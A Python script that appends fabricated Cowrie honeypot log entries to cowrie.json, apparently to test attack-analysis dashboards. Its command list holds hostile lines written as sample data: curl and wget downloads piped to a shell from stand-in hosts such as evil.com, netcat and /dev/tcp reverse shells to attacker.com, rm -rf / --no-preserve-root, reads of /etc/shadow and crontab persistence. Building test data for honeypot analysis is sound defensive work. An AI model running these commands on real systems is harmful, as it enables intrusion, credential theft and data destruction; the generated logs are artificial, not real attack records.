import json
import random
from datetime import datetime
import time
import os

# Path to your cowrie.json log
LOG_FILE = "../cowrie/var/log/cowrie/cowrie.json"

# Fake attack data
fake_ips = [f"192.168.1.{i}" for i in range(2, 50)] + \
           [f"10.0.0.{i}" for i in range(2, 50)] + \
           [f"172.16.0.{i}" for i in range(2, 50)]

fake_users = ["root", "admin", "test", "pi", "user"]
fake_passwords = ["123456", "password", "toor", "admin", "raspberry"]
fake_cmds = [
    # Recon / Information gathering
    "ls", "pwd", "whoami", "id", "uname -a",
    "cat /etc/passwd", "cat /etc/shadow", "cat /etc/hosts",
    "ifconfig", "ip a", "netstat -tulnp", "ps aux",

    # Persistence
    "echo '* * * * * root echo hacked >> /etc/crontab'",
    "echo 'malware' > /tmp/mal.txt",
    "touch /root/.ssh/authorized_keys",

    # Privilege escalation attempts
    "sudo su", "sudo -l", "chmod 777 /etc/passwd",
    "chattr -i /etc/shadow",

    # Malware download & execution
    "wget http://malicious-site.com/bad.sh -O- | sh",
    "curl -s http://evil.com/malware.sh | bash",
    "wget http://hacker.net/rootkit.tar.gz",
    "curl -O http://infected.com/payload",
    "python3 -c \"import os;os.system('id')\"",
    "perl -e 'print qx(id)'",

    # Backdoor / reverse shell
    "nc -e /bin/sh attacker.com 4444",
    "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "rm -rf / --no-preserve-root",
    "echo 'hacked' > /var/tmp/owned.txt",

    # Scanning
    "nmap -sV target.com -p 22",
    "nmap -A 127.0.0.1",
    "masscan 0.0.0.0/0 -p22",

    # File/system exploration
    "ls -la /root/",
    "ls -la /home/",
    "cat ~/.bash_history",
    "cat /proc/cpuinfo",
    "df -h",
    "free -m",

    # Misc hacking tools
    "wget http://botnet.com/bot.py",
    "curl http://exploit.org/exploit.c -o exploit.c",
    "gcc exploit.c -o exploit",
    "./exploit"
]
def generate_fake_entry():
    """Generate a single fake Cowrie log entry"""
    entry = {
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%fZ"),
        "src_ip": random.choice(fake_ips),
        "username": random.choice(fake_users),
        "password": random.choice(fake_passwords),
        "command": random.choice(fake_cmds),
        "dst_port": 2222,
        "eventid": "cowrie.session.command"
    }
    return entry

def append_to_log(entry):
    """Append fake entry to cowrie.json"""
    with open(LOG_FILE, "a") as f:
        json.dump(entry, f)
        f.write("\n")  # new line for each entry

def simulate_attacks(num_attacks=50, delay=1):
    """Simulate multiple fake attacks"""
    for i in range(num_attacks):
        entry = generate_fake_entry()
        append_to_log(entry)
        print(f"[+] Fake attack {i+1} logged: {entry['src_ip']} -> {entry['command']}")
        time.sleep(delay)

if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        print(f"[!] Cowrie log file not found at {LOG_FILE}")
    else:
        print("[*] Starting fake attack simulation...")
        simulate_attacks(num_attacks=30, delay=0.5)  # 30 fake attacks with 0.5s delay
        print("[*] Done! Check your analysis graphs again.")
